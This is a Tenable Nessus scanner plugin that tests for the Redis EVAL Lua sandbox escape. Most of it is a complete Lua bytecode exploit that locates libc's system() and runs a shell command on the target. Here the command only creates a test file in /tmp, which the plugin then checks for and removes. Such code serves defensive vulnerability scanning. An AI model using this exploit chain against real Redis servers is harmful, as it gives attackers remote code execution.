#TRUSTED 212a14c305437f6d24d8c8528e9041c679c3d548fbdf79157116cd88219af06d9ab6c588e1f99414021ee083434e91e5642a5471c599047bfc2bf79473f851bc004f34b10e872108925621a797d20c950accba3ed2307bee2ab28209ffa251cd48e3d1d15f1cfb145272ea55c3f569f082718ad7099de49e2ebd897b81031486add8539649de8f4791347aab43a075e51acf019e06e1dc93dff5dde4716ab8b27b7c1561d15b182e2ad6f305d351445a58114df63f07b79c7d2121fe0a7e1c55b3b32174edab4449ea3594db1f24bb83b3c4d03b19fb351824ab7cf507c41dc335b259de0c118b81652985a42788bdf38d31a08cf0b6d8f48535021207c1ff0b3d193594066c52f985ded562891345517455897bb6c75229516a5060e80fdc07a6effc94962de526f36140f2b20f6f854d02b58564ba00837b30c3476b0d6a150108a9a43e2e39553d560e0e5da7a68de98d40eaa27e61bf0fcc23482701dd0e3f8ad18f1268d1591484ea786ca855f7a6e68864cf8d771fac991416bae921c3a43db3d20029fc2fb517a8040016a4b5a3531c5f38db6c896a46a5ec27c0cb0314bf8cdffb29e84e9afd466549710f7b363809b1efb2c09a89c7ef75949660d9373d3c09c396a634468d91219660b27bb862160a8bbfbb3f173ec7e0ad564c1faeae4fe45f70a7431b1e9002652fbfb27987cb6a75a8bb9c5ee9c5c8eabab064
#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(111108);
  script_version("1.4");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_name(english:"Redis EVAL Lua Sandbox Escape");

  script_set_attribute(attribute:"synopsis", value:
"Redis before 2.8.21 and 3.x before 3.0.2 allows remote attackers to 
execute arbitrary Lua bytecode via the eval command.");
  script_set_attribute(attribute:"description", value:
"Redis before 2.8.21 and 3.x before 3.0.2 allows remote attackers to 
execute arbitrary Lua bytecode via the eval command.");
  # http://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d07c07d6");
  script_set_attribute(attribute:"solution", value:
"Update to redis 3.0.2 or later");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/09/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/09/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/04/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:pivotal_software:redis");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2018-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("redis_detect.nbin", "ssh_get_info.nasl");
  script_require_keys("Host/local_checks_enabled");
  script_require_ports("Services/redis_server", 6379);

  exit(0);
}
include("audit.inc");
include("global_settings.inc");
include("ssh_func.inc");
include("telnet_func.inc");
include("hostlevel_funcs.inc");
include("misc_func.inc");
include("string.inc");


function cmdtohex(command)
{
    #add some padding after the command to make it 16 bytes
    if (strlen(command) % 16 != 0)
      command = command + crap(length:8 - (strlen(command) % 8),data:'\0');

    local_var hex_cmd = "";
    local_var i = 0;
    for (i = 0;i < strlen(command);i+=8)
    {
        local_var c1 = hexstr(string_reverse(substr(command,i,i + 3)));
        if (strlen(c1) % 8)
            c1 = "0" + c1;
        local_var c2 = hexstr(string_reverse(substr(command,i+4 ,i + 7)));
        if (strlen(c2) % 8)
            c2 = "0" + c2;
        hex_cmd = hex_cmd + "dwords_to_double(0x" + c1 + ", 0x" + c2 + "),";
    }
    return hex_cmd;
}

luacode1 = 'eval \'local asnum = loadstring((string.dump(function(x) for i = x, x, 0 do return i end end):' +
'gsub("\\96%z%z\\128", "\\22\\0\\0\\128")))  local function double_to_dwords(x) if x == 0 then return 0, 0 ' +
'end if x < 0 then x = -x end  local m, e = math.frexp(x)  if e + 1023 <= 1 then m = m * 2^(e + 1074) ' +
'e = 0 else m = (m - 0.5) * 2^53 e = e + 1022 end  local lo = m % 2^32 m = (m - lo) / 2^32 local hi = ' +
'm + e * 2^20  return lo, hi end  local function dwords_to_double(lo, hi) local m = hi % 2^20 local e = ' +
'(hi - m) / 2^20 m = m * 2^32 + lo  if e ~= 0 then m = m + 2^52 else e = 1 end  return m * 2^(e-1075) end  ' +
'local function dword_to_string(x) local b0 = x % 256; x = (x - b0) / 256 local b1 = x % 256; x = (x - b1) / 256 ' +
'local b2 = x % 256; x = (x - b2) / 256 local b3 = x % 256  return string.char(b0, b1, b2, b3) end ' +
' local function qword_to_string(x) local lo, hi = double_to_dwords(x) return dword_to_string(lo) .. ' +
'dword_to_string(hi) end  local function add_dword_to_double(x, n) local lo, hi = double_to_dwords(x) ' +
'return dwords_to_double(lo + n, hi) end  local function band(a, b) local p, c=1, 0 while a > 0 and b > 0 ' +
'do local ra, rb = a % 2, b % 2 if ra + rb > 1 then c = c + p end a, b, p = (a - ra) / 2, (b - rb) / 2, p * ' +
'2 end  return c end  rawset(_G, "add_dword_to_double", add_dword_to_double) rawset(_G, "asnum", asnum) ' +
'rawset(_G, "double_to_dwords", double_to_dwords) rawset(_G, "dwords_to_double", dwords_to_double) ' +
'rawset(_G, "dword_to_string", dword_to_string) rawset(_G, "qword_to_string", qword_to_string) ' +
'rawset(_G, "band", band) collectgarbage "stop" debug.sethook()\' 0';

luacode2a = 'eval \'coroutine.wrap(loadstring(string.dump(function() local magic = nil local function middle() ' +
'local asnum = asnum local double_to_dwords = double_to_dwords local add_dword_to_double = add_dword_to_double ' +
'local dwords_to_double = dwords_to_double local qword_to_string = qword_to_string local band = band local co = ' +
'coroutine.wrap(function() end) local substr = string.sub local find = string.find local upval  local ' +
'luastate1 = asnum(coroutine.running()) local luastate2 = add_dword_to_double(luastate1, 8)  local n1 = 1 ' +
'local n2 = 2 local n4 = 4 local n6 = 6 local n7 = 7 local n8 = 8 local n16 = 16 local n24 = 24 local n32 = 32  ' +
'local hfff = 0xfff00000 local h38 = 0x38  local PT_DYNAMIC = 2 local DT_NULL = 0 local DT_STRRAB = 5 ' +
'local DT_SYMTAB = 6 local DT_DEBUG = 21  local libc = "libc.so." local system = "__libc_system" ' +
'local null = "\\0" local empty = "" local luastate1_bkp local luastate2_bkp local lo, hi local base ' +
'local ptheader local dynamic local symbol local debug  local s, e, tmp, n local str = empty local ' +
'link_map local libc_dynamic local libc_base local libc_system local libc_strtab local libc_symtab ' +
'local commands = {';
luacode2b = '}  local function put_into_magic(n) upval = "nextnexttmpaddpa" .. qword_to_string(n) ' +
'local upval_ptr = qword_to_string(add_dword_to_double(asnum(upval), 24)) magic = upval_ptr .. upval_ptr ' +
'.. upval_ptr end  put_into_magic(add_dword_to_double(asnum(co), n32))  lo, hi = double_to_dwords(asnum(magic))' +
' base = dwords_to_double(band(lo, hfff), hi) put_into_magic(add_dword_to_double(base, n32))  lo, ' +
'hi = double_to_dwords(asnum(magic)) ptheader = add_dword_to_double(base, lo)  while true do put_into_magic(ptheader)' +
' lo, hi = double_to_dwords(asnum(magic)) if lo == PT_DYNAMIC then put_into_magic(add_dword_to_double(ptheader, n16)) ' +
'dynamic = asnum(magic) break else ptheader = add_dword_to_double(ptheader, h38) end end  while true do put_into_magic(dynamic)' +
' lo, hi = double_to_dwords(asnum(magic))  if lo == DT_DEBUG then put_into_magic(add_dword_to_double(dynamic, n8)) ' +
'debug = asnum(magic) break else dynamic = add_dword_to_double(dynamic, n16) end end  put_into_magic(add_dword_to_double(debug, n8))' +
' link_map = asnum(magic)  while true do  put_into_magic(add_dword_to_double(link_map, n8)) n = asnum(magic)  ' +
'while true do put_into_magic(n) tmp = qword_to_string(asnum(magic))  s, e = find(tmp, null) if s then str = str .. ' +
'substr(tmp, n1, s - n1) break else str = str .. tmp n = add_dword_to_double(n, n8) end end  s, e = find(str, libc) if s ' +
'then put_into_magic(link_map) libc_base = asnum(magic)  put_into_magic(add_dword_to_double(link_map, n16)) libc_dynamic = ' +
'asnum(magic)  while true do put_into_magic(libc_dynamic) lo, hi = double_to_dwords(asnum(magic)) ' +
'put_into_magic(add_dword_to_double(libc_dynamic, n8))  if lo == DT_NULL then break elseif lo == DT_STRRAB ' +
'then libc_strtab = asnum(magic) elseif lo == DT_SYMTAB then libc_symtab = asnum(magic) end  libc_dynamic = ' +
'add_dword_to_double(libc_dynamic, n16) end  break else put_into_magic(add_dword_to_double(link_map, n24)) ' +
'link_map = asnum(magic) end end  while true do put_into_magic(libc_symtab) lo, hi = double_to_dwords(asnum(magic))' +
'  n = add_dword_to_double(libc_strtab, lo) str = empty while true do put_into_magic(n) tmp = qword_to_string(asnum(magic))' +
'  s, e = find(tmp, null) if s then str = str .. substr(tmp, n1, s - n1) break else str = str .. tmp n = ' +
'add_dword_to_double(n, n8) end end  if str and str == system then put_into_magic(add_dword_to_double(libc_symtab, n8))' +
' lo, hi = double_to_dwords(asnum(magic)) libc_system = add_dword_to_double(libc_base, lo) break else libc_symtab = ' +
'add_dword_to_double(libc_symtab, n24) end end  put_into_magic(add_dword_to_double(asnum(co), n32)) magic = libc_system ' +
'put_into_magic(luastate1) luastate1_bkp = asnum(magic) put_into_magic(luastate2) luastate2_bkp = asnum(magic) for i=n1,#commands,n2 ' +
'do put_into_magic(luastate1) magic = commands[i] put_into_magic(luastate2) magic = commands[i + n1] co() end put_into_magic(luastate1) ' +
'magic = luastate1_bkp put_into_magic(luastate2) magic = luastate2_bkp end middle() end):gsub("(\\100%z%z%z)....", "%1\\0\\0\\0\\1", 1)))()\' 0';

filename = rand_str(length:3);
cmd = "echo 1>/tmp/"+filename;
ping_cmd = cmdtohex(command:cmd);
full_msg = luacode1 + '\n\n' + luacode2a + ping_cmd + luacode2b + '\n\n';

port = get_service(svc:"redis_server", default:6379, exit_on_fail:TRUE);

# Open TCP socket to send the RCE code
soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

# Send data and now it should write NES in /tmp/a
send(socket:soc, data:full_msg);

res = recv(socket:socket, length:1024);
sleep(1);
close(soc);

if (islocalhost())
{
  if (!defined_func("pread")) exit(1, "'pread()' is not defined.");
  info_t = INFO_LOCAL;
}
else
{
  info_t = INFO_SSH;
  ret = ssh_open_connection();
  if (!ret) exit(1, "Failed to open an SSH connection.");
}
file_path = "/tmp/" + filename;
res = info_send_cmd(cmd:'ls  /tmp | grep \'' + filename + '\'');

if(filename >< res)
{
  res = info_send_cmd(cmd:'rm -f ' + file_path);
  if (info_t == INFO_SSH) ssh_close_connection();

  report = "Nessus was able to exploit the vulnerability and created a file " + file_path;
  security_report_v4(port:0, severity:SECURITY_HOLE, extra:report);
}
else
{
  if (info_t == INFO_SSH) ssh_close_connection();
  audit(AUDIT_LISTEN_NOT_VULN, "Redis Server", port);
}
